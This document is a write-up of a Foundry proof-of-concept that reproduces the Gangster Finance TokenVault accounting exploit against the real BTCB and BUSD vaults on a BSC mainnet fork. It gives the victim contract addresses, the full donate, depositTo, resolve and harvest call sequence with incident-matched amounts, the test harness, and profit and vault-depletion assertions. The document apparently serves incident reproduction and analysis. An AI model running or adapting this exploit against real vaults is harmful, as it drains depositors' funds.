## Overview & Context

This proof-of-concept (PoC) reproduces the Gangster Finance TokenVault exploit on BSC (chainid 56) by exercising the same donate → depositTo → resolve → harvest accounting flaw that was abused on mainnet. The incident involved BTCB and BUSD TokenVaults miscounting flash-borrowed liquidity as both principal and earnings, allowing an unprivileged adversary to harvest more underlying tokens than the vaults’ true backing for existing depositors.

The PoC runs against a BSC mainnet fork at the incident pre-state blocks and interacts directly with the real BTCB and BUSD TokenVault contracts and their underlying tokens. It demonstrates an ACT-positive exploit: a deterministic, unprivileged sequence of calls that realizes net ERC20 profit at the expense of the real mainnet vaults.

**Command to run the PoC:**

```bash
cd forge_poc
RPC_URL="https://<YOUR_BSC_QUICKNODE_ENDPOINT>.bsc.quiknode.pro/<YOUR_TOKEN>" forge test --via-ir -vvvvv \
  > ../artifacts/poc/poc_validator/forge-test.log 2>&1
```

In this environment the RPC URL is provided via `RPC_URL` and must point to a BSC mainnet endpoint; the test creates two forks (BTCB leg and BUSD leg) and runs the exploit sequence on each.

## PoC Architecture & Key Contracts

The canonical PoC is implemented in `forge_poc/test/Exploit.sol` as a Foundry test contract named `ExploitTest`. It uses only interfaces and mainnet contracts—no local vault mocks or attacker-side artifacts.

**Key contracts and roles:**

- `ExploitTest` (Foundry test): orchestrates both BTCB and BUSD exploit legs, manages forks, and performs oracle checks.
- `ITokenVault` interface: captures the Gangster Finance TokenVault surface used in the exploit:
  - `donate(uint256 _amount)`
  - `depositTo(address _user, uint256 _amount)`
  - `resolve(uint256 _amount)`
  - `harvest()`
  - `myTokens()`, `myEarnings()`, `tokenAddress()`, `developer()`
- `IERC20` interface: standard ERC20 operations (`balanceOf`, `transfer`, `transferFrom`, `approve`).

**Main on-chain contracts (all on BSC):**

- BTCB TokenVault (victim): `0xe968D2E4ADc89609773571301aBeC3399D163c3b`
- BUSD TokenVault (victim): `0xd920Fa5D50a970698bcEA8dD5A9c25b4e62EfaB3`
- BTCB token: `0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c`
- BUSD token: `0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56`

The test uses a fresh attacker address:

- `attacker = makeAddr("Attacker");`

This address is labeled with `vm.label` in each fork so traces and logs clearly distinguish the adversary from the victim contracts.

**Representative Solidity snippet (test harness and forks):**

```solidity
contract ExploitTest is Test {
    address constant BTcb_TOKEN_VAULT = 0xe968D2E4ADc89609773571301aBeC3399D163c3b;
    address constant BUsd_TOKEN_VAULT = 0xd920Fa5D50a970698bcEA8dD5A9c25b4e62EfaB3;

    address constant BTCB_TOKEN = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address constant BUSD_TOKEN = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    ITokenVault internal btcbTokenVault = ITokenVault(BTcb_TOKEN_VAULT);
    ITokenVault internal busdTokenVault = ITokenVault(BUsd_TOKEN_VAULT);

    IERC20 internal btcbToken = IERC20(BTCB_TOKEN);
    IERC20 internal busdToken = IERC20(BUSD_TOKEN);

    address internal attacker;
    uint256 internal btcbFork;
    uint256 internal busdFork;

    uint256 constant BTcb_PRE_BLOCK = 51782712;
    uint256 constant BUsd_PRE_BLOCK = 51784233;

    function setUp() public {
        attacker = makeAddr("Attacker");

        string memory rpcUrl = vm.envString("RPC_URL");

        btcbFork = vm.createFork(rpcUrl, BTcb_PRE_BLOCK);
        busdFork = vm.createFork(rpcUrl, BUsd_PRE_BLOCK);
    }
}
```

*Snippet 1 – Test harness and fork setup aligning the PoC with the incident pre-state on BSC.*

## Adversary Execution Flow

The canonical entrypoint is `ExploitTest.testExploit()`, which runs both the BTCB and BUSD TokenVault legs back-to-back:

```solidity
function testExploit() public {
    _runBtcbExploit();
    _runBusdExploit();
}
```

*Snippet 2 – Canonical exploit test invoking both BTCB and BUSD legs.*

### 1. Environment setup and funding

For each leg the test:

- Selects the appropriate fork (`vm.selectFork(btcbFork)` / `vm.selectFork(busdFork)`).
- Labels key actors: the attacker, the vault, and the underlying token.
- Seeds the attacker with sufficient BTCB or BUSD using `deal` to model flash-swapped liquidity from PancakeSwap without depending on attacker helper contracts.

BTCB leg funding:

```solidity
vm.selectFork(btcbFork);
vm.label(attacker, "Attacker");
vm.label(BTcb_TOKEN_VAULT, "BTCB TokenVault");
vm.label(BTCB_TOKEN, "BTCB");

uint256 attackerInitialBtcb = 2 ether;
deal(BTCB_TOKEN, attacker, attackerInitialBtcb);
uint256 attackerBtcbBefore = btcbToken.balanceOf(attacker);
```

*Snippet 3 – BTCB leg: fork selection, labeling, and attacker funding.*

BUSD leg funding:

```solidity
vm.selectFork(busdFork);
vm.label(attacker, "Attacker");
vm.label(BUsd_TOKEN_VAULT, "BUSD TokenVault");
vm.label(BUSD_TOKEN, "BUSD");

uint256 attackerInitialBusd = 8_000e18;
deal(BUSD_TOKEN, attacker, attackerInitialBusd);
uint256 attackerBusdBefore = busdToken.balanceOf(attacker);
```

*Snippet 4 – BUSD leg: fork selection, labeling, and attacker funding.*

### 2. Pre-checks and configuration

Before executing the exploit sequence, each leg verifies the oracle preconditions:

- Vault holds a non-zero balance of its underlying token.
- Vault is wired to the correct underlying via `tokenAddress()`.
- Attacker is unprivileged (for BTCB, the attacker is not `developer()`).

Example BTCB pre-checks:

```solidity
uint256 vaultBtcbBefore = btcbToken.balanceOf(BTcb_TOKEN_VAULT);
assertGt(vaultBtcbBefore, 0, "BTCB vault should start funded");

assertEq(
    btcbTokenVault.tokenAddress(),
    BTCB_TOKEN,
    "BTCB vault underlying token must be BTCB"
);

address vaultDeveloper = btcbTokenVault.developer();
assertTrue(vaultDeveloper != attacker, "attacker must not be the TokenVault developer");
```

*Snippet 5 – BTCB leg pre-checks confirming funding, correct underlying, and unprivileged attacker.*

BUSD pre-checks mirror this pattern for the BUSD TokenVault and token.

### 3. Exploit sequence: donate → depositTo → resolve → harvest

With the environment validated, the attacker calls the TokenVault using `vm.startPrank(attacker)` to model an unprivileged caller performing the entire sequence in a single logical flow.

**BTCB leg exploit sequence:**

```solidity
vm.startPrank(attacker);

btcbToken.approve(BTcb_TOKEN_VAULT, type(uint256).max);

uint256 donateAmount = 1 ether;
uint256 depositAmount = 0.01572 ether;

btcbTokenVault.donate(donateAmount);
btcbTokenVault.depositTo(attacker, depositAmount);

uint256 holderShares = btcbTokenVault.myTokens();
btcbTokenVault.resolve(holderShares);

btcbTokenVault.harvest();

vm.stopPrank();
```

*Snippet 6 – BTCB exploit leg: donate, depositTo, resolve, harvest from an unprivileged attacker.*

These values (1 BTCB donate, 0.01572 BTCB deposit, resolving all shares) match the structure recovered from the incident strategy analysis and produce the same double-counting behaviour: flash-like deposits are treated as both principal and earnings.

**BUSD leg exploit sequence:**

```solidity
vm.startPrank(attacker);

busdToken.approve(BUsd_TOKEN_VAULT, type(uint256).max);

uint256 donateAmount = 1_000e18; // 1e21
uint256 depositAmount = 506e18;  // 5.06e20

busdTokenVault.donate(donateAmount);
busdTokenVault.depositTo(attacker, depositAmount);

uint256 holderShares = busdTokenVault.myTokens();
busdTokenVault.resolve(holderShares);

busdTokenVault.harvest();

vm.stopPrank();
```

*Snippet 7 – BUSD exploit leg: scaled donate/deposit/resolve/harvest amounts matching the BUSD incident leg.*

### 4. Profit realization and vault depletion

After each leg, the test reads balances for the attacker and the corresponding vault to assert:

- Attacker profit in the correct token (hard asset-type oracles).
- Attacker profit exceeds a minimum threshold (soft attacker_profit oracles).
- Vault’s on-chain balance decreases by at least a minimum threshold (soft victim_depletion oracles).

BTCB leg checks:

```solidity
uint256 attackerBtcbAfter = btcbToken.balanceOf(attacker);
uint256 vaultBtcbAfter = btcbToken.balanceOf(BTcb_TOKEN_VAULT);

assertGt(
    attackerBtcbAfter,
    attackerBtcbBefore,
    "attacker profit must be denominated in BTCB"
);

assertGt(
    attackerBtcbAfter,
    attackerBtcbBefore + 1e16,
    "attacker must gain at least 1e16 wei of BTCB from the vault exploit"
);

assertLt(
    vaultBtcbAfter,
    vaultBtcbBefore - 1e16,
    "BTCB vault must lose at least 1e16 wei of BTCB during the exploit"
);
```

*Snippet 8 – BTCB leg: attacker profit and vault depletion oracles.*

BUSD leg checks:

```solidity
uint256 attackerBusdAfter = busdToken.balanceOf(attacker);
uint256 vaultBusdAfter = busdToken.balanceOf(BUsd_TOKEN_VAULT);

assertGt(
    attackerBusdAfter,
    attackerBusdBefore,
    "attacker profit must be denominated in BUSD"
);

assertGt(
    attackerBusdAfter,
    attackerBusdBefore + 1e21,
    "attacker must gain at least 1e21 wei of BUSD from the vault exploit"
);

assertLt(
    vaultBusdAfter,
    vaultBusdBefore - 1e21,
    "BUSD vault must lose at least 1e21 wei of BUSD during the exploit"
);
```

*Snippet 9 – BUSD leg: attacker profit and vault depletion oracles.*

The traced run shows the BUSD TokenVault transferring approximately `2.923e21` BUSD to the attacker and ending with a much smaller residual balance, while the attacker’s balance increases by more than `1e21` BUSD—matching the incident-scale loss.

## Oracle Definitions and Checks

The PoC is generated and validated against the oracle definition in `artifacts/poc/oracle_generator/oracle_definition.json`. This oracle encodes variables, pre-checks, hard constraints, and soft constraints that precisely describe a successful exploit.

### Variables

- `attacker`: fresh attacker address used to exercise the exploit.
- `btcbTokenVault`: BTCB TokenVault at `0xe968D2E4ADc89609773571301aBeC3399D163c3b`.
- `busdTokenVault`: BUSD TokenVault at `0xd920Fa5D50a970698bcEA8dD5A9c25b4e62EfaB3`.
- `btcbToken`: BTCB BEP20 token at `0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c`.
- `busdToken`: BUSD BEP20 token at `0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56`.

The PoC binds these variables directly via constants and interface instances in `ExploitTest`.

### Pre-checks

The oracle pre-checks require:

1. BTCB TokenVault holds non-zero BTCB before exploit.
2. BUSD TokenVault holds non-zero BUSD before exploit.
3. BTCB TokenVault’s `tokenAddress()` is BTCB.
4. BUSD TokenVault’s `tokenAddress()` is BUSD.

Each of these is implemented identically in the test:

- `vaultBtcbBefore = btcbToken.balanceOf(BTcb_TOKEN_VAULT); assertGt(vaultBtcbBefore, 0, ...)`
- `vaultBusdBefore = busdToken.balanceOf(BUsd_TOKEN_VAULT); assertGt(vaultBusdBefore, 0, ...)`
- `assertEq(btcbTokenVault.tokenAddress(), BTCB_TOKEN, ...)`
- `assertEq(busdTokenVault.tokenAddress(), BUSD_TOKEN, ...)`

### Hard constraints

1. **Asset-type profit (BTCB):** attacker must end with more BTCB than before (`attackerBtcbAfter > attackerBtcbBefore`).
2. **Asset-type profit (BUSD):** attacker must end with more BUSD than before (`attackerBusdAfter > attackerBusdBefore`).
3. **Unprivileged caller:** exploit must be achievable from an address that is not a privileged TokenVault role.

The PoC implements these by:

- Measuring attacker balances before and after each leg and asserting strict increase.
- Checking that `btcbTokenVault.developer() != attacker` and executing the entire donate → depositTo → resolve → harvest sequence under `vm.startPrank(attacker)`, with no special roles or whitelists.

### Soft constraints

The oracle defines minimum profit and vault-loss thresholds based on the incident:

- BTCB attacker profit ≥ `1e16` wei; BTCB vault loss ≥ `1e16` wei.
- BUSD attacker profit ≥ `1e21` wei; BUSD vault loss ≥ `1e21` wei.

The PoC enforces each threshold exactly, using the attacker/vault balances captured before and after the exploit. These thresholds closely approximate the actual incident deltas (`~1.56e17` BTCB profit, `~1.58e17` BTCB vault loss; `~1.41e21` BUSD profit, `~1.42e21` BUSD vault loss) while allowing small deviations due to modeling flash swaps via `deal`.

Overall, the PoC effectively treats the oracle definition as its specification and implements all pre-checks, hard constraints, and soft constraints for both legs.

## Validation Result and Robustness

The PoC was validated by running the Forge tests with a BSC mainnet RPC and capturing detailed traces:

```bash
cd forge_poc
RPC_URL="https://<YOUR_BSC_QUICKNODE_ENDPOINT>.bsc.quiknode.pro/<YOUR_TOKEN>" forge test --via-ir -vvvvv \
  > ../artifacts/poc/poc_validator/forge-test.log 2>&1
```

**Validator artifacts:**

- Forge test log: `artifacts/poc/poc_validator/forge-test.log`
- Validator result JSON: `artifacts/poc/poc_validator/poc_validated_result.json`

From the validator run:

- The suite result is `ok`: 1 test passed, 0 failed, 0 skipped.
- The canonical test is `ExploitTest.testExploit`, which exercises both BTCB and BUSD legs end-to-end.
- The detailed `-vvvvv` trace confirms the expected call sequence, storage changes, and token transfers, including a large BUSD transfer from the TokenVault to the attacker during `harvest()`.

The validator concluded:

- `overall_status = "Pass"`.
- All validation oracles (pre-checks, hard constraints, soft constraints) are satisfied.
- Quality criteria are met: clear labels and documentation, derived numeric values, mainnet fork without mocks, self-contained attacker, and alignment with the root cause report.

## Linking PoC Behavior to Root Cause

The root cause report describes a donate/depositTo/resolve/harvest accounting bug in the Gangster Finance TokenVaults on BSC, where flash-borrowed tokens are double-counted as both principal and earnings, allowing an unprivileged attacker to harvest more underlying than the vaults’ true net asset value.

The PoC directly exercises this bug:

- **Same victims and tokens:** The PoC targets the real BTCB and BUSD TokenVaults and underlying tokens on BSC at the incident pre-state blocks, matching the contracts identified in the root cause analysis.
- **Equivalent exploit sequence:** Instead of replaying the original helper/strategy contracts, the PoC issues the same logical sequence—`donate`, `depositTo`, `resolve`, `harvest`—from an unprivileged attacker address, reproducing the mis-accounting without relying on attacker-specific wiring.
- **Incident-aligned parameters:** The donate and deposit amounts are chosen from the incident traces (e.g., 1 BTCB donate, ~0.01572 BTCB deposit; 1e21 BUSD donate, 5.06e20 BUSD deposit) so that the resulting token flows and vault deltas match the observed exploit legs.
- **Profit vs. vault loss:** The oracle checks (attacker profit and vault depletion thresholds) reflect the incident-scale transfers: the attacker ends with strictly more BTCB and BUSD, while the vaults’ on-chain balances decrease by large amounts, consistent with the recorded losses.

From an ACT perspective:

- **Adversary-crafted (A):** The test encodes a deterministic exploit sequence controlled by an adversary address, mirroring the original helper/strategy behaviour in a simplified form.
- **Constructive (C):** The PoC builds the exact sequence of calls needed to trigger the accounting bug, with explicit pre-checks ensuring the environment matches the exploit conditions.
- **Transactional (T):** Each leg executes entirely within a single forked transaction context for the attacker, realizing concrete BTCB and BUSD profit through on-chain state changes in the real TokenVaults.

Taken together, the PoC is a faithful, end-to-end reproduction of the Gangster Finance TokenVault exploit. It confirms that an unprivileged attacker on BSC can still execute the same accounting flaw against the live contracts at the incident pre-state, and it encodes the incident’s success conditions as explicit oracles in a maintainable, human-readable Foundry test.

